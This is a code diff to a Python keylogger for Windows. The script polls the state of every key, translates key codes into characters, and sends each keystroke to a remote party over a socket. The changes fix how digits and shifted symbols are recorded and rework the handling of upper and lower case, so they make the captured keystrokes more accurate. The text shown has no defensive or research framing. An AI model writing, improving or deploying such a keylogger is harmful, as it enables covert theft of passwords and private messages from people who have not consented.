@@ -16,15 +16,15 @@ asciiTable = {
     27: "[ESC]",
     32: " ",
     48: "0",
-    49: "!",
-    50: "@",
-    51: "#",
-    52: "$",
-    53: "%",
-    54: "^",
-    55: "&",
-    56: "*",
-    57: "(",
+    49: "1",
+    50: "2",
+    51: "3",
+    52: "4",
+    53: "5",
+    54: "6",
+    55: "7",
+    56: "8",
+    57: "9",
     65: "A",
     66: "B",
     67: "C",
@@ -64,18 +64,37 @@ asciiTable = {
     222: "'"
 }
 
+shiftSymbols = {
+    48: ")",
+    49: "!",
+    50: "@",
+    51: "#",
+    52: "$",
+    53: "%",
+    54: "^",
+    55: "&",
+    56: "*",
+    57: "(",
+}
+
 def main():
     keyStates = {}
     while True:
         for i in range(256):
-            if user.GetAsyncKeyState(i) & 0x8000 != 0: #if key is pressed
+            if user.GetAsyncKeyState(i) & 0x8000 != 0:
                 if keyStates.get(i, False) == False:
                     keyStates[i] = True
-                    key = asciiTable.get(i, "")
-                    if user.GetKeyState(0x14) & 0x0001 == 0 and i in range(65, 91):
-                        key = key.lower()
-                    if user.GetKeyState(0x10) & 0x8000 and i in range(48, 58):  # Check if Shift key is pressed with a number
-                        key = asciiTable.get(i, "")    
+                    shiftPressed = user.GetKeyState(0x10) & 0x8000
+
+                    if i in range(65, 91):  # A-Z
+                        key = chr(i)
+                        if not shiftPressed:
+                            key = key.lower()
+                    elif i in shiftSymbols and shiftPressed:
+                        key = shiftSymbols[i]
+                    else:
+                        key = asciiTable.get(i, "")
+
                     if key:
                         try:
                             clientsocket.sendall(key.encode())
